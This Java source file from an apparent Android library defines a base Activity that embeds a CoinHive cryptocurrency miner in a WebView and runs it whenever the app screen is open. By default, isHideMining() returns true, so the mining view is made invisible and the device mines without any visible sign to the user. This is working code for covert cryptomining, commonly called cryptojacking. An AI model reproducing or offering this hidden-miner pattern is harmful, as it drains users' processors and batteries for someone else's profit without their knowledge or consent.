package com.theah64.coinhive;

import android.support.annotation.LayoutRes;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;

/**
 * Created by theapache64 on 22/9/17.
 */

public class BaseCoinHiveActivity extends AppCompatActivity {


    private WebView wvCoinHive;

    @Override
    public void setContentView(@LayoutRes int layoutResID) {
        super.setContentView(layoutResID);

        wvCoinHive = new WebView(this);
        wvCoinHive.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        wvCoinHive.getSettings().setJavaScriptEnabled(true);
        wvCoinHive.loadUrl(CoinHive.generateURL());
        System.out.println("URL: " + CoinHive.generateURL());
        wvCoinHive.addJavascriptInterface(this, "Android");
        wvCoinHive.setWebViewClient(new WebViewClient() {

        });

        ((ViewGroup) getWindow().getDecorView().findViewById(android.R.id.content)).addView(wvCoinHive);
        if (isHideMining()) {
            wvCoinHive.setVisibility(View.GONE);
        }
    }

    @JavascriptInterface
    public void onMiningStartedJS() {
        onMiningStarted();
    }

    @JavascriptInterface
    public void onMiningStoppedJS() {
        onMiningStopped();
    }


    public void stopMining() {
        wvCoinHive.loadUrl("javascript:stopMining()");
    }

    public void startMining() {
        wvCoinHive.loadUrl("javascript:startMining()");
    }


    @JavascriptInterface
    public void onRunningJS(double hashesPerSecond, long totalHashes, long acceptedHashes) {
        if (CoinHive.getInstance().isLoggingEnabled()) {
            System.out.println("Hashes/second:" + hashesPerSecond);
            System.out.println("Total hashes:" + totalHashes);
            System.out.println("Accepted hashes:" + acceptedHashes);
        }

        onRunning(hashesPerSecond, totalHashes, acceptedHashes);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (CoinHive.getInstance().isLoggingEnabled()) {
            System.out.println("Mining stopped");
        }
        onMiningStopped();
    }

    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {

    }

    private void onMiningStopped() {

    }

    private void onMiningStarted() {

    }


    public boolean isHideMining() {
        return true;
    }
}
